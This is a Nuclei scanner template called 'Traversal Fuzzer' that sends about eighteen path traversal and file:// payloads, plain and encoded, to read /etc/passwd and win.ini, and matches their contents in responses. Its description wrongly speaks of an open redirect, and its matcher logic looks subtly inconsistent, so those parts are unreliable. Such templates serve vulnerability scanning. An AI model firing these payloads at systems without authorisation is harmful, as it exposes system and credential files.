id: traversal-erickfernandox

info:
  name: Traversal Fuzzer
  author: erickfernandox
  severity: high
  description: |
    An open redirect vulnerability was detected. An attacker can redirect a user
    to a malicious site and possibly obtain sensitive information, modify data, 
    and/or execute unauthorized operations.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-601
  metadata:
    max-request: 3
  tags: traversal, generic

http:
  - method: GET
    path:
      - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini"
      - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../etc/passwd"
      - "{{BaseURL}}/../../../../../../../../../windows/win.ini"
      - "{{BaseURL}}/../../../../../../../../../etc/passwd"      
      - "{{BaseURL}}?file=/../../../../../../../../../etc/passwd&url=/../../../../../../../../../etc/passwd"
      - "{{BaseURL}}?file=/../../../../../../../../../windows/win.ini&url=/../../../../../../../../../windows/win.ini"
      - "{{BaseURL}}?file=file:///etc/passwd&url=file:///etc/passwd"      
      - "{{BaseURL}}?file=file:///windows/win.ini&url=file:///windows/win.ini"            
      - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini"
      - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
      - "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini"
      - "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"            
      - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini%00"
      - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../etc/passwd%00"      
      - "{{BaseURL}}/../../../../../../../../../windows/win.ini%00"
      - "{{BaseURL}}/../../../../../../../../../etc/passwd%00"
      - "{{BaseURL}}/..;/..;/..;/..;/..;/..;/..;/..;/..;/windows/win.ini"
      - "{{BaseURL}}/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd"         
      
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:[x*]:0:0:"
          - "\\[(font|extension|file)s\\]"     
      
      - type: status
        status:
          - 200
        condition: or
